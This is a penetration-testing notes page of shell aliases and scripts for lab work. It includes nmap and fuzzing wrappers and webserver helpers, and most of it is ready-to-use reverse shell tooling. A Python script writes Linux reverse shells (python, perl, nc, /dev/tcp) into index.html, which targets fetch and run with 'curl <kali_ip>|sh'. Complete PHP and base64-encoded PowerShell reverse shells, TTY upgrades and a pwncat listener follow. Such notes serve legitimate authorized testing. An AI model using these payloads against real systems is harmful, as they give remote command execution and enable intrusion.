---
title: Tips and tricks
source_url: https://notes.incendium.rocks/pentesting-notes/tips-and-tricks/tips-and-tricks
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: methodology
---

## Tmux

tmux is a terminal multiplexer. It lets you switch easily between several programs in one terminal, detach them (they keep running in the background) and reattach them to a different terminal.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FVnwqWrVz70HUK2skvSH7%2Fimage.png?alt=media&amp;token=5539d8e3-8555-4ee8-beac-beaf51ff5b22" alt=""><figcaption></figcaption></figure>

## Revshells.com

Generate reverse shells for all platforms

## Make use of aliases and examples

You will be 100x more efficient by using aliases of commands you use a lot, I got most aliases underneath from <https://github.com/jazzpizazz/zsh-aliases>.

### **List IP's**

```bash
list_ips() {
  ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "[\033[96m" iface"\033[0m] "a[1] }'
}
```

![](https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FdQQqqp4jO6ByntupRigj%2Fimage.png?alt=media\&token=f8a44917-9bdb-4085-9a08-a075c7ebaefa)

### **Make directory and CD into it**

```bash
mkdir_cd() {
  mkdir $1 && cd $_
}
```

### Setup webserver

```bash
alias www="list_ips && ls_pwd && sudo python3 -m http.server 80"
```

```bash
┌──(kali㉿kali)-[~/htb/Visual]
└─$ www
[eth0] 192.168.146.129
[eth1] 192.168.178.119
[eth2] 10.10.1.130
[tun0] 10.10.14.166
[/home/kali/htb/Visual]
app.git  custom  hash  nc64.exe  rce  rce.git  test.git  tmp  winPEAS.bat  winPEAS.ps1  xx
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.234 - - [02/Oct/2023 05:52:25] "GET /winPEAS.bat HTTP/1.1" 200 -

```

### Default nmap scan

This alias scans a target, and stores the output

{% code title="nmap\_default.sh" lineNumbers="true" %}

```bash
nmap_default () {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: nmap_default ip (options)"
    else
      [ ! -d "./nmap" ] && echo "[i] Creating $(pwd)/nmap..." && mkdir nmap
      sudo nmap -sCV -T4 --min-rate 10000 "${@}" -v -oA nmap/tcp_default
  fi
}
```

{% endcode %}

### Nmap UDP

{% code title="nmap\_udp.sh" overflow="wrap" lineNumbers="true" %}

```bash
nmap_udp () {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: nmap_udp ip (options)"
    else
      [ ! -d "./nmap" ] && echo "[i] Creating $(pwd)/nmap..." && mkdir nmap
      sudo nmap -sUCV -T4 --min-rate 10000 "${@}" -v -oA nmap/udp_default
  fi
```

{% endcode %}

### Generate linux reverse shells into index.html

{% code title="gen\_lin\_rev.sh" lineNumbers="true" %}

```bash
#!/usr/bin/env python
import os, sys

payload = '''
if command -v python > /dev/null 2>&1; then
        python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("x.x.x.x",yyyy)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
        exit;
fi

if command -v perl > /dev/null 2>&1; then
        perl -e 'use Socket;$i="x.x.x.x";$p=yyyy;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
        exit;
fi

if command -v nc > /dev/null 2>&1; then
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x yyyy >/tmp/f
        exit;
fi

if command -v sh > /dev/null 2>&1; then
        /bin/sh -i >& /dev/tcp/x.x.x.x/yyyy 0>&1
        exit;
fi
'''

if(len(sys.argv) < 3):
    print("[?] Usage gen_lin_rev ip port")
    exit(1)

payload = payload.replace("x.x.x.x", sys.argv[1]).replace("yyyy", sys.argv[2])

with open("index.html", "w") as f:
    f.write("#! /bin/sh\n\n" + payload)

print("[+] Wrote Linux reverse shells to {}/index.html".format(os.getcwd()))

```

{% endcode %}

I always combine this with [#setup-webserver](#setup-webserver "mention")to get a EZ reverse shell with Linux machine's:

```bash
curl <kali_ip>|sh
```

This pipes index.html to sh and executes all the reverse shells possibilities.

### Generate PHP reverse shell

{% code title="gen\_php\_rev.sh" lineNumbers="true" %}

```bash
#!/usr/bin/env python
import os, sys

payload = '''\
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = 'x.x.x.x';
$port = yyyy;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}
?>'''

if(len(sys.argv) < 3):
    print("[?] Usage gen_lin_rev ip port")
    exit(1)

payload = payload.replace("x.x.x.x", sys.argv[1]).replace("yyyy", sys.argv[2])

with open("rev.php", "w") as f:
    f.write(payload)

print("[+] Wrote PHP reverse shell to {}/rev.php".format(os.getcwd()))
```

{% endcode %}

### Generate PowerShell reverse shell

{% code title="gen\_ps\_rev.sh" lineNumbers="true" %}

```bash
gen_ps_rev () {
        if [ "$#" -ne 2 ]
        then
                echo "[i] Usage: gen_ps_rev ip port"
        else
                SHELL=`cat ~/zsh-aliases/shells/ps_rev.txt | sed s/x.x.x.x/$1/g | sed s/yyyy/$2/g | iconv -f utf8 -t utf16le | base64 -w 0`
                echo "powershell -ec $SHELL" | xclip -sel clip
        fi
}
```

{% endcode %}

{% code title="ps\_rev.txt" lineNumbers="true" %}

```
$TargetHost = "x.x.x.x";
$TargetPort = yyyy;
$CommandExec = "powershell"
$CommandArgs = ""
$ErrorActionPreference = "Stop";
try{
$Client = New-Object System.Net.Sockets.TcpClient;
$Client.Connect($TargetHost, $TargetPort);
$Stream = $Client.GetStream();
Write-Output "Connected!"
$Process = New-Object System.Diagnostics.Process;
$Process.StartInfo.FileName = $CommandExec
$Process.StartInfo.Arguments = $CommandArgs
$Process.StartInfo.RedirectStandardOutput = $true;
$Process.StartInfo.RedirectStandardInput = $true;
$Process.StartInfo.UseShellExecute = $false;
$Process.Start() | Out-Null;
$CharBuf = New-Object Char[] 65536;
$ByteBuf = New-Object Byte[] 65536;
Function ReadStream{ $Stream.ReadAsync($ByteBuf, 0 ,65530) }
Function ReadStdout{ $Process.StandardOutput.ReadAsync($CharBuf, 0, 65535) }
$T1 = ReadStream
$T2 = ReadStdout
while($true){
$T = [System.Threading.Tasks.Task]::WaitAny($T1, $T2)
if($T -eq 0){
if(($N = $T1.Result) -eq 0){ throw "Socket EOF."; }
while($ByteBuf[$($N-1)] -band 0x80){
if($Stream.Read($ByteBuf, $N++, 1) -eq 0){
throw "Socket EOF."
}
}
$String = [System.Text.Encoding]::UTF8.GetString($ByteBuf[0..$($N-1)])
$Process.StandardInput.Write($String);
$T1 = ReadStream
}else{
if(($N = $T2.Result) -eq 0){ throw "Process EOF."; }
$Bytes = [System.Text.Encoding]::UTF8.GetBytes($CharBuf, 0, $N)
$Stream.Write($Bytes, 0, $Bytes.Count);
$T2 = ReadStdout
}
}
}catch{
Write-Output $_.ToString()
}finally{
Write-Output "Shutting down."
try{ $Client.Close() }catch{ }
try{ $Process.Kill() }catch{ }
}

```

{% endcode %}

### Upgrade shells

```bash
py_tty_upgrade () {
  echo "python -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
}
py3_tty_upgrade () {
  echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
}
alias script_tty_upgrade="echo '/usr/bin/script -qc /bin/bash /dev/null'| xclip -sel clip"
alias tty_fix="stty raw -echo; fg; reset"
alias tty_conf="stty -a | sed 's/;//g' | head -n 1 | sed 's/.*baud /stty /g;s/line.*//g' | xclip -sel clip"
```

### Pwncat

Will start pwncat in a env and listen on port 1337

```bash
alias pwncat='source /home/kali/pwncat-env/bin/activate;pwncat-cs 0.0.0.0:1337'
```

### Setup Ligolo

{% code title="ligolo.sh" lineNumbers="true" %}

```bash
#!/usr/bin/env python
import os, sys

os.system("sudo ip tuntap add user root mode tun ligolo 2>/dev/null; sudo ip link set ligolo up 2>/dev/null")
try:
    os.system(f"sudo ip route add {sys.argv[1]} dev ligolo")
    print(f"[+] Successfully added {sys.argv[1]} as route")
except Exception:
    print(f"[!] Error in adding route")
    exit()
os.system("sudo proxy -laddr 0.0.0.0:443 -selfcert")
```

{% endcode %}

### Fuzz directories

{% code title="dirfuzzer.sh" lineNumbers="true" %}

```bash
#!/bin/bash

# Check if the URL argument is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <url>"
    exit 1
fi

# Assign the URL to a variable
url="$1"

# Execute the feroxbuster command
feroxbuster -u "$url" -q --output dirs_and_files.txt
```

{% endcode %}

### Fuzz vhosts

{% code title="vhostfuzzer.sh" lineNumbers="true" %}

```bash
#!/bin/bash

# Check if the domain argument is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <domain>"
    exit 1
fi

# Assign the domain to a variable
domain="$1"

# Run ffuf
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.$domain" -u http://$domain -ac
```

{% endcode %}

## Write your own scripts

For most things there will be a open source tool, but these tools often come with way too much functionality then actually needed. So write your own tools to prevent noise on the target. You will also be a lot more efficient if you got your own toolset.
